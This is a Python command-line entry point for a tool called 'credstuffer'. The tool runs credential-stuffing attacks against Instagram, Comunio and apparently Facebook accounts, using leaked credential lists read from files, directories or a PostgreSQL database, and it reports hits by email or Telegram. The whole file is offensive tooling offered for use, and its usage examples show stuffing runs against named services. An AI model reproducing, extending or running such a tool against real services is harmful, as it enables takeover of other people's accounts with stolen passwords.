import argparse
import logging

from credstuffer.utils.logger import Logger
from credstuffer.algorithm import Algorithm
from credstuffer import __version__
from credstuffer.accounts import Comunio, Instagram
from credstuffer.exceptions import AccountInstanceError


class Credstuffer:
    """ class Credstuffer

    USAGE:
            credstuffer = Credstuffer()

    """
    def __init__(self, account, usernames, max_requests=1000000, token=None, filepath=None, dirpath=None,
                 schemas=None, tables=None, **params):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Credstuffer')

        self.account = account
        self.usernames = usernames
        self.max_requests = max_requests
        self.notify = list()
        self.token = token
        self.filepath = filepath
        self.dirpath = dirpath
        self.mailparams = dict()
        self.dbparams = dict()
        self.schemas = schemas
        self.tables = tables

        if 'mail' in params.keys():
            if ('smtp' and 'port' and 'sender' and 'receiver' and 'password') in params['mail'].keys():
                self.mailparams.update(params['mail'])
                self.notify.append('mail')
            else:
                self.logger.error("No mail parameters provided!")
        else:
            self.logger.error("No mail parameters provided!")

        if 'database' in params.keys():
            if ('host' and 'port' and 'username' and 'password' and 'dbname') in params['database'].keys():
                self.dbparams.update(params['database'])
        else:
            self.logger.error("No database parameters provided!")

        if self.token is not None:
            self.notify.append('telegram')

        # create account instances
        self.accounts = list()
        account_instance = self.create_instance(account=self.account, max_requests=self.max_requests, notify=self.notify
                                                , token=self.token, **self.mailparams)
        self.accounts.append(account_instance)

    def create_instance(self, account, max_requests, notify, token, **kwargs):
        """ creates the account instance

        :param account: name of the account
        :param max_requests: max requests for the proxy
        :param notify: notify
        :param kwargs: keyword args
        :return: instance of the account attribute
        """
        if account == 'comunio':
            return Comunio(max_requests=max_requests, notify=notify, token=token, **kwargs)
        elif account == 'instagram':
            return Instagram(max_requests=max_requests, notify=notify, token=token, **kwargs)
        else:
            raise AccountInstanceError("Could not create Account Instance")

    def run(self):
        """ runs the credstuffer application

        """

        # create the stuffing algorithm
        algo = Algorithm(accounts=self.accounts, usernames=self.usernames)
        if self.filepath is not None:
            algo.file_stuffing(filepath=self.filepath)
        elif self.dirpath is not None:
            algo.directory_stuffing(dirpath=self.dirpath)
        else:
            algo.database_stuffing(schemas=self.schemas, tables=self.tables, **self.dbparams)


def main():

    # credstuffer usage
    usage1 = "credstuffer instagram --usernames \"John, Jane\" database --host 192.168.1.2 --port 5432 --user john " \
             "--password test1234 --dbname postgres"
    usage2 = "credstuffer facebook --usernames \"John, Jane\" file --path /home/john/credentials.txt"
    usage3 = "credstuffer comunio --usernames \"John, Jane\" --Nsmtp smtp.web.de --Nport 587 --Nsender john@web.de " \
             "--Nreceiver jane@web.de --Npassword johnjane file --dir /opt/collections/"

    description = "console script for application credstuffer \n\nUsage:\n    {}\n    {}\n    {}".format(usage1, usage2,
                                                                                                         usage3)
    # parse arguments for credstuffer
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)

    # account required
    parser.add_argument('account', choices=['comunio', 'instagram', 'facebook'], help='The account you want to stuffing')
    subparsers = parser.add_subparsers(dest='subcommand', help='File or Database subcommands')

    # parser for file parameters
    parser_file = subparsers.add_parser('file', help='Path to a single file or a directory')
    parser_file.add_argument('-p', '--path', type=str, help='Path to a single file')
    parser_file.add_argument('-d', '--dir',  type=str, help='Path to a directory')

    # parser for database parameters
    parser_database = subparsers.add_parser('database', help='Database connection arguments')
    parser_database.add_argument('-H', '--host',     type=str, help='Hostname for the database connection', required=True)
    parser_database.add_argument('-P', '--port',     type=int, help='Port for the database connection', required=True)
    parser_database.add_argument('-U', '--user',     type=str, help='User for the database connection', required=True)
    parser_database.add_argument('-p', '--password', type=str, help='Password from the user', required=True)
    parser_database.add_argument('-DB', '--dbname',  type=str, help='Database name', required=True)
    parser_database.add_argument('-s', '--schemas',  type=str, help='Schemas in database name')
    parser_database.add_argument('-t', '--tables',   type=str, help='Tables in database schema')

    # parser for notification parameters
    parser_notifyer = parser.add_argument_group('Notification', 'Define arguments for Mail or Telegram Notification')
    parser_notifyer.add_argument('--Nsmtp', type=str, help='SMTP email server')
    parser_notifyer.add_argument('--Nport', type=int, help='SMTP Port')
    parser_notifyer.add_argument('--Nsender', type=str, help='email from sender')
    parser_notifyer.add_argument('--Nreceiver', type=str, help='email from receiver')
    parser_notifyer.add_argument('--Npassword', type=str, help='password from sender email')

    parser_notifyer.add_argument('--token', type=str, help="Telegram token")

    # provide usernames for given account
    parser_usernames = parser.add_argument_group('Usernames', 'Provided Usernames for the account')
    parser_usernames.add_argument('--usernames', type=str,  help='Usernames for the given account')

    parser.add_argument('-v', '--version', action='version', version=__version__, help='show the current version')

    args = parser.parse_args()

    # set up logger instance
    logger = Logger(account=args.account, name='credstuffer', level='info', log_folder='/var/log/')
    logger.info("start application credstuffer")

    params = dict()
    nsmtp = args.Nsmtp
    nport = args.Nport
    nsender = args.Nsender
    nreceiver = args.Nreceiver
    npassword = args.Npassword

    params.setdefault('mail', {'smtp': nsmtp, 'port': nport, 'sender': nsender, 'receiver': nreceiver,
                               'password': npassword})

    if args.usernames is None:
        print("Please provide usernames for the given account")
        exit(0)
    else:
        account_usernames = args.usernames.split(',')

    if args.subcommand == 'file':
        if args.path is not None:
            logger.info("process credential file")

            credstuffer = Credstuffer(account=args.account, usernames=account_usernames, token=args.token,
                                      filepath=args.path, **params)
        else:
            credstuffer = Credstuffer(account=args.account, usernames=account_usernames, token=args.token,
                                      dirpath=args.dir, **params)

    else:
        logger.info("process database parameters")
        host = args.host
        port = args.port
        username = args.user
        password = args.password
        dbname = args.dbname
        params.setdefault('database', {'host': host, 'port': port, 'username': username, 'password': password,
                                       'dbname': dbname})

        schemas = args.schemas
        tables = args.tables

        credstuffer = Credstuffer(account=args.account, usernames=account_usernames, token=args.token,
                                  schemas=schemas, tables=tables, **params)

    # run the credstuffer application
    credstuffer.run()


if __name__ == '__main__':
    main()
